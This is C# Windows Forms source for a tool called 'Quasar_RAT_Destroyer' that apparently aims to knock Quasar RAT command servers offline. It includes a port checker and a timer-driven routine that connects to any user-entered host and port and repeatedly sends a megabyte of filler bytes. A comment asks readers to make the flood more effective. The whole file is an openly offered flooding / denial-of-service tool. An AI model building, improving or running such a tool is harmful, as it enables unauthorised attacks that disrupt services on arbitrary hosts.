using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Linq.Expressions;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Quasar_RAT_Destroyer
{
    public partial class Form1 : Form
    {

        private readonly TcpClient client = new TcpClient();
        private NetworkStream mainStream;
        private int portNumber;

        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Start();
            button2.Enabled = false;
            button3.Enabled = true;
        }

        private async void timer1_Tick(object sender, EventArgs e)
        {
            portNumber = int.Parse(textBox2.Text);

            using (TcpClient newClient = new TcpClient())
            {
                try
                {
                    newClient.Connect(textBox1.Text, portNumber);
                }
                catch (Exception)
                {
                    timer1.Stop();
                    timer1.Enabled = false;
                    button2.Enabled = true;
                    button3.Enabled = false;
                    MessageBox.Show("The Attack has been Failed", "Error");
                    return;
                }

                mainStream = newClient.GetStream();

                int durationInMilliseconds = (int)numericUpDown1.Value * 1000;
                byte[] dataToSend = GenerateLargeData(); // Generate the large data

                await Task.Delay(durationInMilliseconds);

                // Send the large data
                try
                {
                    await mainStream.WriteAsync(dataToSend, 0, dataToSend.Length);
                }
                catch (Exception)
                {
                    // Handle any exceptions here
                }
            }

            mainStream.Close();
        }

        private byte[] GenerateLargeData()
        {
            string largeData = new string('A', 1000000);
            return Encoding.UTF8.GetBytes(largeData);
            // I'm not sure how to Improve this so it will actually Flood the Quasar Server, if you can just modify it..
        }


        private void button3_Click(object sender, EventArgs e)
        {
            timer1.Enabled=false;
            timer1.Stop();
            button2.Enabled = true;
            button3.Enabled = false;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            int portNumber = int.Parse(textBox2.Text);

            using (TcpClient tcpClient = new TcpClient())
            {
                try
                {
                    tcpClient.Connect(textBox1.Text, portNumber);

                    if (tcpClient.Connected)
                    {
                        label6.Text = "Port Status: Open";
                        label6.ForeColor = Color.Green;
                        System.Media.SoundPlayer player = new System.Media.SoundPlayer(Properties.Resources.open);
                        player.Play();
                    }
                    else
                    {
                        label6.Text = "Port Status: Closed";
                        label6.ForeColor = Color.Red;
                        System.Media.SoundPlayer player = new System.Media.SoundPlayer(Properties.Resources.closed);
                        player.Play();
                    }
                }
                catch (Exception)
                {
                    label6.Text = "Port Status: Closed";
                    label6.ForeColor = Color.Red;
                    System.Media.SoundPlayer player = new System.Media.SoundPlayer(Properties.Resources.closed);
                    player.Play();
                }
            }
        }
    }
}
